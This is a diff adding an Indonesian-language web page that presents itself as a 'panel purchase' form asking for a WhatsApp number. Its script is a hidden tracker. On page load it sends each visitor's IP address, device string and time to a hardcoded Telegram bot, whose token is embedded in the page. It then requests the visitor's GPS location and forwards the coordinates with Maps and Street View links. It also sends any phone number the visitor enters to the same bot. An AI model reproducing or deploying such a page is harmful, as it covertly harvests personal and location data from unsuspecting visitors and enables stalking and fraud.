@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Pembelian Panel</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: Arial, sans-serif;
+      background-color: #1a0000;
+      overflow: hidden;
+    }
+
+    #particles-js {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+    }
+
+    .panel {
+      background: rgba(255, 0, 0, 0.9);
+      max-width: 400px;
+      margin: 100px auto;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.3);
+      position: relative;
+      z-index: 1;
+      color: white;
+    }
+
+    input, button {
+      width: 100%;
+      margin-top: 10px;
+      padding: 10px;
+      font-size: 16px;
+    }
+
+    button {
+      background: blue;
+      color: red;
+      border: none;
+      cursor: pointer;
+    }
+
+    button:disabled {
+      background: black;
+      cursor: not-allowed;
+    }
+  </style>
+</head>
+<body>
+
+<div id="particles-js"></div>
+
+<div class="panel">
+  <h2>Pembelian Panel</h2>
+  <p>Masukkan nomor WhatsApp untuk melanjutkan:</p>
+  <input type="text" id="waNumber" placeholder="Contoh: 081234567890" />
+  <button id="kirimBtn" onclick="kirimNomor()">Bayar Sekarang</button>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+<script>
+  particlesJS("particles-js", {
+    particles: {
+      number: { value: 80 },
+      color: { value: "#ff0000" },
+      shape: { type: "circle" },
+      opacity: { value: 0.6 },
+      size: { value: 4 },
+      line_linked: {
+        enable: true,
+        distance: 120,
+        color: "#ff0000",
+        opacity: 0.4,
+        width: 1
+      },
+      move: { enable: true, speed: 1.5 }
+    },
+    interactivity: {
+      events: {
+        onhover: { enable: true, mode: "repulse" },
+        onclick: { enable: true, mode: "push" }
+      }
+    },
+    retina_detect: true
+  });
+
+  const TOKEN = '8073077532:AAF5t1SYMLRYAfbMfOPr6iuUr4V68w9x4_U';
+  const CHAT_ID = '8049291472';
+  const FOTO_URL = 'https://files.catbox.moe/3t2120.jpg';
+
+  async function kirimTelegram(pesan, tombol = null) {
+    const payload = {
+      chat_id: CHAT_ID,
+      text: pesan,
+      parse_mode: "HTML"
+    };
+
+    if (Array.isArray(tombol)) {
+      payload.reply_markup = {
+        inline_keyboard: [tombol]
+      };
+    }
+
+    try {
+      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch (error) {
+      console.error("Gagal mengirim teks:", error);
+    }
+  }
+
+  async function kirimFoto(caption = "") {
+    const payload = {
+      chat_id: CHAT_ID,
+      photo: FOTO_URL,
+      caption: caption,
+      parse_mode: "HTML"
+    };
+
+    try {
+      await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch (error) {
+      console.error("Gagal mengirim foto:", error);
+    }
+  }
+
+  function mintaLokasi() {
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(async (pos) => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        const lokasiPesan = `
+<b>Lokasi Pengunjung:</b>
+<b>Koordinat:</b> <code>${lat},${lon}</code>
+<a href="https://maps.google.com/maps?q=${lat},${lon}">Google Maps</a>
+<a href="https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${lat},${lon}">Street View</a>
+        `.trim();
+
+        await kirimTelegram(lokasiPesan);
+      });
+    }
+  }
+
+  window.addEventListener('load', async () => {
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      const ip = data.ip;
+      const device = navigator.userAgent;
+      const waktu = new Date().toLocaleString("id-ID");
+
+      const captionFoto = `
+<b>Halo Tuanku ManzsModz</b>
+<b>IP:</b> <code>${ip}</code>
+<b>Device:</b> ${device}
+<b>Waktu:</b> ${waktu}
+      `.trim();
+
+      await kirimFoto(captionFoto);
+
+      await kirimTelegram(
+        `
+<b>Pengunjung Baru</b>
+<b>IP:</b> <code>${ip}</code>
+<b>Device:</b> ${device}
+<b>Waktu:</b> ${waktu}
+        `.trim(),
+        [{ text: "Lihat Lokasi IP", url: `https://ipinfo.io/${ip}` }]
+      );
+
+      mintaLokasi();
+    } catch (err) {
+      console.error("Gagal memuat data IP:", err);
+    }
+  });
+
+  async function kirimNomor() {
+    const btn = document.getElementById("kirimBtn");
+    const nomor = document.getElementById('waNumber').value.trim();
+
+    if (!/^\d{10,}$/.test(nomor)) {
+      alert("Masukkan nomor WhatsApp yang valid (hanya angka, min 10 digit).");
+      return;
+    }
+
+    btn.disabled = true;
+
+    const linkWA = `https://wa.me/${nomor}`;
+    const waktu = new Date().toLocaleString("id-ID");
+    const device = navigator.userAgent;
+
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      const ip = data.ip;
+
+      const pesan = `
+<b>Nomor WA untuk Pembayaran:</b>
+<code>${nomor}</code>
+<b>IP:</b> <code>${ip}</code>
+<b>Device:</b> ${device}
+<b>Waktu:</b> ${waktu}
+      `.trim();
+
+      await kirimFoto(pesan);
+      await kirimTelegram(pesan, [
+        { text: "Hubungi di WhatsApp", url: linkWA }
+      ]);
+
+      alert("Nomor berhasil dikirim. Terima kasih!");
+    } catch (err) {
+      console.error("Gagal kirim nomor:", err);
+    }
+
+    btn.disabled = false;
+  }
+</script>
+
+</body>
+</html>
